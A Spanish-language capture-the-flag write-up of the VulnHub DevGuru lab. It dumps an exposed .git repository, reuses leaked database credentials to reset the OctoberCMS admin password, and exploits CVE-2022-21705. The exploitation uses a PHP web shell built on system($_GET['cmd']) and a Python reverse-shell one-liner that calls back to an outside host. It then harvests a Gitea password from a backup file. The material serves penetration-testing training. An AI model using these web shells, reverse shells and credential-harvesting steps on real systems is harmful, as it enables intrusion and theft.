---
title: VulnHub DevGuru
author: k4miyo
date: 2023-07-10
math: true
mermaid: true
image:
  path: /assets/images/vulnhub/vulnhub.png
categories: [Medium, Linux]
tags: [Web, SSH]
ping: true
---

## Máquina DevGuru
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.0.0.96 (la cual se obtiene con el comando `netdiscover`).

```bash
Currently scanning: 192.168.39.0/16   |   Screen View: Unique Hosts                                                                                                                        
                                                                                                                                                                                            
 25 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 1500                                                                                                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.0.96       00:0c:29:dc:09:70      1      60  VMware, Inc.                  
```

```bash
❯ ping -c 1 10.0.0.96
PING 10.0.0.96 (10.0.0.96) 56(84) bytes of data.
64 bytes from 10.0.0.96: icmp_seq=1 ttl=64 time=1.92 ms

--- 10.0.0.96 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.919/1.919/1.919/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo (sistema operativo). A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.0.0.96 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 19:01 CST
Initiating ARP Ping Scan at 19:01
Scanning 10.0.0.96 [1 port]
Completed ARP Ping Scan at 19:01, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:01
Completed Parallel DNS resolution of 1 host. at 19:01, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:01
Scanning 10.0.0.96 [65535 ports]
Discovered open port 22/tcp on 10.0.0.96
Discovered open port 80/tcp on 10.0.0.96
Discovered open port 8585/tcp on 10.0.0.96
Completed SYN Stealth Scan at 19:01, 4.25s elapsed (65535 total ports)
Nmap scan report for 10.0.0.96
Host is up, received arp-response (0.00033s latency).
Scanned at 2023-07-10 19:01:11 CST for 4s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
8585/tcp open  unknown syn-ack ttl 64
MAC Address: 00:0C:29:DC:09:70 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.49 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.0.0.96
   5   │     [*] Open ports: 22,80,8585
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80,8585 10.0.0.96 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 19:02 CST
Nmap scan report for 10.0.0.96
Host is up (0.00061s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a46e82b01ff57587a5f25a4d6f2898e (RSA)
|   256 0879939ce3b4a4be80ad619dd388d284 (ECDSA)
|_  256 9cf988d43377064ed97c39173e079cbd (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corp - DevGuru
|_http-generator: DevGuru
| http-git: 
|   10.0.0.96:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit 
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project type: PHP application (guessed from .gitignore)
8585/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=ceaee8b26e1bcf3d; Path=/; HttpOnly
|     Set-Cookie: _csrf=rkdl-ykuY_kaAoJa8eVTkUFlfHg6MTY4OTAzNzMyODM5NzQ1MzY3NA; Path=/; Expires=Wed, 12 Jul 2023 01:02:08 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 11 Jul 2023 01:02:08 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=5a9f744731a8e94b; Path=/; HttpOnly
|     Set-Cookie: _csrf=g1ZrWBe5Cxmi0vlaXCg0wbRZDCk6MTY4OTAzNzMyODQxMzA1MTE4Mg; Path=/; Expires=Wed, 12 Jul 2023 01:02:08 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 11 Jul 2023 01:02:08 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8585-TCP:V=7.93%I=7%D=7/10%Time=64ACAA10%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2A00,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=ceaee8b26e1bcf3d;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=rkdl-ykuY_kaAoJa8eVTkUF
SF:lfHg6MTY4OTAzNzMyODM5NzQ1MzY3NA;\x20Path=/;\x20Expires=Wed,\x2012\x20Ju
SF:l\x202023\x2001:02:08\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
SF:IGIN\r\nDate:\x20Tue,\x2011\x20Jul\x202023\x2001:02:08\x20GMT\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<head\x
SF:20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"v
SF:iewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<me
SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>
SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<link
SF:\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"use-c
SF:redentials\">\n\t<meta\x20name=\"theme-color\"\x20content=\"#6cc644\">\
SF:n\t<meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x20a
SF:\x20cup\x20of\x20tea\"\x20/>\n\t<meta\x20name=\"description\"\x20conten
SF:t=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
SF:nless")%r(HTTPOptions,212C,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent
SF:-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20
SF:Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=5a9f744731
SF:a8e94b;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=g1ZrWBe5Cxmi0vla
SF:XCg0wbRZDCk6MTY4OTAzNzMyODQxMzA1MTE4Mg;\x20Path=/;\x20Expires=Wed,\x201
SF:2\x20Jul\x202023\x2001:02:08\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x2
SF:0SAMEORIGIN\r\nDate:\x20Tue,\x2011\x20Jul\x202023\x2001:02:08\x20GMT\r\
SF:n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n
SF:<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20n
SF:ame=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\">
SF:\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t
SF:<title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x20a\x20c
SF:up\x20of\x20tea\x20</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/man
SF:ifest\.json\"\x20crossorigin=\"use-credentials\">\n\t<meta\x20name=\"th
SF:eme-color\"\x20content=\"#6cc644\">\n\t<meta\x20name=\"author\"\x20cont
SF:ent=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/>\n\t<me
SF:ta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\x20a\x20
SF:c");
MAC Address: 00:0C:29:DC:09:70 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.38 seconds
```

Vemos el dominio `devguru.local`, por lo que vamos a agregarlo a nuestro archivo `/etc/hosts`. Vemos los puertos 80 y 8585 abiertos asociados a servicios web, por lo que antes de echarles un ojo, vamos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://devguru.local/
http://devguru.local/ [200 OK] Apache[2.4.29], Cookies[october_session], Country[RESERVED][ZZ], Email[support@devguru.loca,support@gmail.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[october_session], IP[10.0.0.96], MetaGenerator[DevGuru], Script, Title[Corp - DevGuru], X-UA-Compatible[IE=edge]
```

![](/assets/images/vh-devguru/devguru.png)

```bash
❯ whatweb http://devguru.local:8585/
http://devguru.local:8585/ [200 OK] Cookies[_csrf,i_like_gitea,lang], Country[RESERVED][ZZ], HTML5, HttpOnly[_csrf,i_like_gitea], IP[10.0.0.96], JQuery, Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[ie=edge]
```

![](/assets/images/vh-devguru/devguru2.png)

Haciendo ***hovering*** no vemos que nos lleve a ningún lado y para el repositorio de ***Gitea*** no contamos con accesos ni podemos crearnos una cuenta; por lo que vamos a tratar de descubrir recursos con nuestra herramienta de confianza `nmap`:

```bash
❯ nmap --script http-enum -p80,8585 10.0.0.96 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 16:54 CST
Nmap scan report for devguru.local (10.0.0.96)
Host is up (0.00048s latency).

PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /.gitignore: Revision control ignore file
|   /.htaccess: Incorrect permissions on .htaccess or .htpasswd files
|   /.git/HEAD: Git folder
|   /0/: Potentially interesting folder
|_  /services/: Potentially interesting folder
8585/tcp open  unknown
MAC Address: 00:0C:29:DC:09:70 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 22.49 seconds
```

Vemos un recurso interesante, `.git`; por lo que podemos buscar una herramienta que nos ayude a enumerar el repositorio; como por ejemplo: [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git). Instalamos `git-dumper` y dumpeamos lo que contiene el repo:

```bash
❯ mkdir git
❯ git-dumper http://devguru.local/.git git/
❯ cd git
❯ ll
drwxr-xr-x root root  38 B  Thu Jul 13 16:59:51 2023  bootstrap
drwxr-xr-x root root 294 B  Thu Jul 13 16:59:51 2023  config
drwxr-xr-x root root  32 B  Thu Jul 13 16:59:51 2023  modules
drwxr-xr-x root root  14 B  Thu Jul 13 16:59:52 2023  plugins
drwxr-xr-x root root  62 B  Thu Jul 13 16:59:52 2023  storage
drwxr-xr-x root root  24 B  Thu Jul 13 16:59:52 2023  themes
.rw-r--r-- root root 354 KB Thu Jul 13 16:59:51 2023  adminer.php
.rw-r--r-- root root 1.6 KB Thu Jul 13 16:59:51 2023  artisan
.rw-r--r-- root root 1.1 KB Thu Jul 13 16:59:51 2023  index.php
.rw-r--r-- root root 1.5 KB Thu Jul 13 16:59:51 2023  README.md
.rw-r--r-- root root 551 B  Thu Jul 13 16:59:52 2023  server.php
```

Encontramos varios recursos que existen y podemos validar que existen en el servidor web:

![](/assets/images/vh-devguru/devguru3.png)

Tomando el recurso `adminer.php` y partiendo de que tenemos los archivos del servidor, podríamos tratar de búscar credenciales de acceso:

```bash
❯ cd config
❯ ll
.rw-r--r-- root root 5.7 KB Thu Jul 13 16:59:51 2023  app.php
.rw-r--r-- root root 1.2 KB Thu Jul 13 16:59:51 2023  auth.php
.rw-r--r-- root root 1.3 KB Thu Jul 13 16:59:51 2023  broadcasting.php
.rw-r--r-- root root 3.5 KB Thu Jul 13 16:59:51 2023  cache.php
.rw-r--r-- root root  16 KB Thu Jul 13 16:59:51 2023  cms.php
.rw-r--r-- root root 579 B  Thu Jul 13 16:59:51 2023  cookie.php
.rw-r--r-- root root 4.6 KB Thu Jul 13 16:59:51 2023  database.php
.rw-r--r-- root root 999 B  Thu Jul 13 16:59:51 2023  environment.php
.rw-r--r-- root root 2.1 KB Thu Jul 13 16:59:51 2023  filesystems.php
.rw-r--r-- root root 3.8 KB Thu Jul 13 16:59:51 2023  mail.php
.rw-r--r-- root root 2.5 KB Thu Jul 13 16:59:51 2023  queue.php
.rw-r--r-- root root 954 B  Thu Jul 13 16:59:51 2023  services.php
.rw-r--r-- root root 6.3 KB Thu Jul 13 16:59:51 2023  session.php
.rw-r--r-- root root 1.0 KB Thu Jul 13 16:59:51 2023  view.php
❯ catn database.php
<?php

return [

    /*
    |--------------------------------------------------------------------------
    | PDO Fetch Style
    |--------------------------------------------------------------------------
    |
    | By default, database results will be returned as instances of the PHP
    | stdClass object; however, you may desire to retrieve records in an
    | array format for simplicity. Here you can tweak the fetch style.
    |
    */

    'fetch' => PDO::FETCH_CLASS,

    /*
    |--------------------------------------------------------------------------
    | Default Database Connection Name
    |--------------------------------------------------------------------------
    |
    | Here you may specify which of the database connections below you wish
    | to use as your default connection for all database work. Of course
    | you may use many connections at once using the Database library.
    |
    */

    'default' => 'mysql',

    /*
    |--------------------------------------------------------------------------
    | Database Connections
    |--------------------------------------------------------------------------
    |
    | Here are each of the database connections setup for your application.
    | Of course, examples of configuring each database platform that is
    | supported by Laravel is shown below to make development simple.
    |
    |
    | All database work in Laravel is done through the PHP PDO facilities
    | so make sure you have the driver for your particular database of
    | choice installed on your machine before you begin development.
    |
    */

    'connections' => [

        'sqlite' => [
            'driver'   => 'sqlite',
            'database' => 'storage/database.sqlite',
            'prefix'   => '',
        ],

        'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => 3306,
            'database'   => 'octoberdb',
            'username'   => 'october',
            'password'   => 'SQ66EBYx4GT3byXH',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
        ],

        'pgsql' => [
            'driver'   => 'pgsql',
            'host'     => 'localhost',
            'port'     => 5432,
            'database' => 'database',
            'username' => 'root',
            'password' => '',
            'charset'  => 'utf8',
            'prefix'   => '',
            'schema'   => 'public',
        ],

        'sqlsrv' => [
            'driver'   => 'sqlsrv',
            'host'     => 'localhost',
            'port'     => 1433,
            'database' => 'database',
            'username' => 'root',
            'password' => '',
            'prefix'   => '',
        ],

    ],

    /*
    |--------------------------------------------------------------------------
    | Migration Repository Table
    |--------------------------------------------------------------------------
    |
    | This table keeps track of all the migrations that have already run for
    | your application. Using this information, we can determine which of
    | the migrations on disk have not actually be run in the databases.
    |
    */

    'migrations' => 'migrations',

    /*
    |--------------------------------------------------------------------------
    | Redis Databases
    |--------------------------------------------------------------------------
    |
    | Redis is an open source, fast, and advanced key-value store that also
    | provides a richer set of commands than a typical key-value systems
    | such as APC or Memcached. Laravel makes it easy to dig right in.
    |
    */

    'redis' => [

        'cluster' => false,

        'default' => [
            'host'     => '127.0.0.1',
            'password' => null,
            'port'     => 6379,
            'database' => 0,
        ],

    ],

    /*
    |--------------------------------------------------------------------------
    | Use DB configuration for testing
    |--------------------------------------------------------------------------
    |
    | When running plugin tests OctoberCMS by default uses SQLite in memory.
    | You can override this behavior by setting `useConfigForTesting` to true.
    |
    | After that OctoberCMS will take DB parameters from the config.
    | If file `/config/testing/database.php` exists, config will be read from it,
    | but remember that when not specified it will use parameters specified in
    | `/config/database.php`.
    |
    */

    'useConfigForTesting' => false,
];
```

Encontramos credenciales de acceso a la base de datos de **Adminer**, asi que vamos a tratar:

![](/assets/images/vh-devguru/devguru4.png)

Una tabla que ya nos debe llamar la atención es **backend_users**, así que vamos a echarle un ojo el contenido:

![](/assets/images/vh-devguru/devguru5.png)

Buscando en internet, vemos que el hash de la contraseña es [bcrypt](https://appdevtools.com/bcrypt-generator), por lo que vamos a crear un nuevo hash con una contraseña que sepamos, por ejemplo: ***admin123***:

![](/assets/images/vh-devguru/devguru6.png)

Vamos a cambiar la contraseña del usuario **frank** por la nuestra:

![](/assets/images/vh-devguru/devguru7.png)

Podríamos tratar de acceder al repositorio con las credenciales **frank : admin123**; sin embargo, vemos que no podemos acceder, así que tratemos de buscar algún recurso en donde podamos acceder. (**Nota**: Como pista, la base de datos de llama OctoberDB, por lo que podría hacer referencia al CMS October)

```bash
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://devguru.local/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devguru.local/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/07/13 17:28:04 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 18661]
/services             (Status: 200) [Size: 10032]
/themes               (Status: 301) [Size: 315] [--> http://devguru.local/themes/]
/modules              (Status: 301) [Size: 316] [--> http://devguru.local/modules/]
/0                    (Status: 200) [Size: 12669]                                  
/storage              (Status: 301) [Size: 316] [--> http://devguru.local/storage/]
/plugins              (Status: 301) [Size: 316] [--> http://devguru.local/plugins/]
/About                (Status: 200) [Size: 18661]                                  
/backend              (Status: 302) [Size: 410] [--> http://devguru.local/backend/backend/auth]
/Services             (Status: 200) [Size: 10032]                                              
/vendor               (Status: 301) [Size: 315] [--> http://devguru.local/vendor/]             
/config               (Status: 301) [Size: 315] [--> http://devguru.local/config/]             
Progress: 4796 / 220547 (2.17%)                                                               ^C
[!] Keyboard interrupt detected, terminating.
                                                                                               
===============================================================
2023/07/13 17:28:35 Finished
===============================================================
```

Vemos que el recurso `/backend` nos redirige a `http://devguru.local/backend/backend/auth`; por lo que vamos a echarle un ojo:

![](/assets/images/vh-devguru/devguru8.png)

Vamos a tratar de acceder con las credenciales que tenemos:

![](/assets/images/vh-devguru/devguru9.png)

Ya nos encontramos dentro del CMS October, así que tratemos de ver una forma que nos ayude a ingresar a la máquina, por ejemplo modificando o subiendo un archivo php que nos ayude a entablarnos una reverse shell. Tratando varias opciones, no podemos subir un archivo PHP, por lo tanto, vamos a tratar de obtener ejecución de comandos a nivel de sistema. Investigando un poco, nos encontramos con el siguiente artículo [Octobercms CVE-2022-21705](https://cyllective.com/blog/post/octobercms-cve-2022-21705) en el cual vemos que podemos crear una función que nos permita ejecutar comandos:

- Opción 1

Crear una nueva página y en la parte de **Markup** colocar la función php que nos ayude a ejecutar comandos:

```bash
<?php
function onInit() {
    passthru('id');
}
==
Hello World.
?>
```

![](/assets/images/vh-devguru/devguru10.png)

Si guardamos los cambios y en la previsualización, ya vemos la ejecución del comando `id`:

![](/assets/images/vh-devguru/devguru11.png)

A este punto podriamos tratar de entablarnos una reverse shell php para ganar acceso a la máquina.

- Opción 2

Utilizar alguna página ya creada, por ejemplo **Home** y crear la siguiente función en el campo de **Code**:

```bash
function onStart() {
	$this->page['getShell'] = system($_GET['cmd']); 
}
```

![](/assets/images/vh-devguru/devguru12.png)

Ahora en la parte de **Markup**, colocamos la siguiente línea:

```bash
{{ page.this.getShell }}
```

![](/assets/images/vh-devguru/devguru13.png)

Guardamos los cambios y accedemos la previsualización.

![](/assets/images/vh-devguru/devguru14.png)

Tendremos el error anterior, si en la dirección URL colocamos `?cmd=whoami`, vemos que ya podemos ejecutar comandos a nivel de sistema.

![](/assets/images/vh-devguru/devguru15.png)

Cualquier opción que hayamos escogido para ejecutar comandos a nivel de sistema, para a ponernos en escucha por el puerto 443 y ahora tratar de entablarnos una reverse shell php:

```bash
http://devguru.local/?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.0.0.75] from (UNKNOWN) [10.0.0.96] 32792
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya nos encontramos dentro de la máquina, así que antes de cualquier cosa, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Una vez dentro, vamos a buscar una manera de escalar priviligos:

```bash
www-data@devguru:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devguru:/var/www/html$ sudo -l
[sudo] password for www-data: 
www-data@devguru:/var/www/html$ find / \-perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/bin/mount
/bin/su
/bin/ntfs-3g
/bin/umount
/bin/ping
/bin/fusermount
www-data@devguru:/var/www/html$ 
```

Podríamos tratar de explotar el binario `/usr/bin/pkexec`, pero vamos a resolver la máquina como fue pensada.

```bash
www-data@devguru:/var/www/html$ find / -user frank 2>/dev/null | grep -v -E "proc"
/var/lib/gitea
/var/lib/gitea/custom
/var/lib/gitea/log
/var/lib/gitea/indexers
/var/lib/gitea/data
/var/lib/gitea/public
/var/backups/app.ini.bak
/usr/local/bin/gitea
/opt/gitea
/home/frank
/etc/gitea
www-data@devguru:/var/www/html$ 
```

Buscando por los archivos cuyo usuario sea **frank**, encontramos uno interesante: `/var/backups/app.ini.bak`, así que vamos a ver que permisos tenemos:

```bash
www-data@devguru:/var/www/html$ ls -la /var/backups/app.ini.bak
-rw-r--r-- 1 frank frank 56688 Nov 19  2020 /var/backups/app.ini.bak
www-data@devguru:/var/www/html$
```

Tenemos permisos de lectura, así que trataremos de buscar palabras claves como `user|username|pass|password|cred`, etc.

```bash
w-data@devguru:/var/www/html$ grep -i -E "user|username|pass|password|cred|creds" /var/backups/app.ini.bak
RUN_USER = frank
; Global limit of repositories per user, applied at creation time. -1 means no limit
; Allow users to push local repositories to Gitea and have them automatically created for a user or an org
ENABLE_PUSH_CREATE_USER                        = false
; GPG key to use to sign commits, Defaults to the default - that is the value of git config --get user.signingkey
; run in the context of the RUN_USER
; the results of git config --get user.name and git config --get user.email respectively and can only be overrided
; - pubkey: only sign if the user has a pubkey
; - twofa: only sign if the user has logged in with twofa
; allow request with credentials
ALLOW_CREDENTIALS = false
; Whether the email of the user should be shown in the Explore Users page
SHOW_USER_EMAIL         = true
; All available themes. Allow users select personalized themes regardless of the value of `DEFAULT_THEME`.
; All available reactions users can choose on issues/prs and comments.
; Whether the full name of the users should be shown where possible. If the full name isn't set, the username will be used.
; Number of users that are displayed on one page
USER_PAGING_NUM   = 50
[ui.user]
; Username to use for the builtin SSH server. If blank, then it is the value of RUN_USER.
BUILTIN_SSH_SERVER_USER               = 
; - empty: if SSH_TRUSTED_USER_CA_KEYS is empty this will default to off, otherwise will default to email, username.
; - email: the principal must match the user's email
; - username: the principal must match the user's username
SSH_AUTHORIZED_PRINCIPALS_ALLOW       = email, username
; Specifies the public keys of certificate authorities that are trusted to sign user certificates for authentication.
; For more information see "TrustedUserCAKeys" in the sshd config manpages.
SSH_TRUSTED_USER_CA_KEYS              = 
; Absolute path of the `TrustedUserCaKeys` file gitea will manage.
; Default this `RUN_USER`/.ssh/gitea-trusted-user-ca-keys.pem
SSH_TRUSTED_USER_CA_KEYS_FILENAME     = 
; For "serve" command it dumps to disk at PPROF_DATA_PATH as (cpuprofile|memprofile)_<username>_<temporary id>
; The "login" choice is not a security measure but just a UI flow change, use REQUIRE_SIGNIN_VIEW to force users to log in.
USER                = gitea
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD              = UfFPTF8C8jjxVF2m
; the user must have creation privileges on it, and the user search path must be set
; to the look into the schema first. e.g.:ALTER USER user SET SEARCH_PATH = schema_name,"$user",public;
; Disallow regular (non-admin) users from creating organizations.
; Default configuration for email notifications for users (user configurable). Options: enabled, onmention, disabled
; !!CHANGE THIS TO KEEP YOUR USER DATA SAFE!!
; How long to remember that a user is logged in before requiring relogin (in days)
COOKIE_USERNAME                          = gitea_awesome
COOKIE_REMEMBER_NAME                     = gitea_incredible
; Reverse proxy authentication header name of user name
REVERSE_PROXY_AUTHENTICATION_USER        = X-WEBAUTH-USER
; The minimum password length for new Users
MIN_PASSWORD_LENGTH                      = 6
; Set to true to allow users to import local server paths
; Set to false to allow users with git hook privileges to create custom git hooks.
; This enables the users to access and modify this config file and the Gitea database and interrupt the Gitea service.
; By modifying the Gitea database, users can gain Gitea administrator privileges.
; It also enables them to access other resources available to the user on the operating system that is running the Gitea instance and perform arbitrary actions in the name of the Gitea OS user.
; Comma separated list of character classes required to pass minimum complexity.
PASSWORD_COMPLEXITY                      = off
; Password Hash algorithm, either "argon2", "pbkdf2", "scrypt" or "bcrypt"
PASSWORD_HASH_ALGO                       = pbkdf2
; Validate against https://haveibeenpwned.com/Passwords to see if a password has been exposed
PASSWORD_CHECK_PWN                       = false
; - Any GNUSocial node (your.hostname.tld/username)
; - <username>.livejournal.com
; Time limit to perform the reset of a forgotten password
RESET_PASSWD_CODE_LIVE_MINUTES                = 180
; Whether a new user needs to confirm their email when registering.
; User must sign in to view anything.
; This setting enables gitea to be signed in with HTTP BASIC Authentication using the user's password
; If you set this to false you will not be able to access the tokens endpoints on the API with your password
; Each new user will get the value of this setting copied into their profile
; Every new user will have rights set to create organizations depending on this setting
; Limited is for signed user only
; True will make the membership of the users visible when added to the organisation
; Dependencies can be added from any repository where the user is granted access or only from the current repository depending on this setting.
; Enable heatmap on users profiles.
ENABLE_USER_HEATMAP                           = true
; Only users with write permissions can track time if this is true
; Default value for the domain part of the user's email address in the git log
; if he has set KeepEmailPrivate to true. The user's email will be replaced with a
; concatenation of the user name in lower case, "@" and NO_REPLY_ADDRESS.
; Show milestones dashboard page - a view of all the user's milestones
; Make the user watch a repository When they commit for the first time
; Mailer user name and password
USER               = 
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD             = 
; redis: network=tcp,addr=:6379,password=macaron,db=0,pool_size=100,idle_timeout=180
; redis: network=tcp,addr=:6379,password=macaron,db=0,pool_size=100,idle_timeout=180
; mysql: go-sql-driver/mysql dsn config string, e.g. `root:password@/session_table`
; Chinese users can choose "duoshuo"
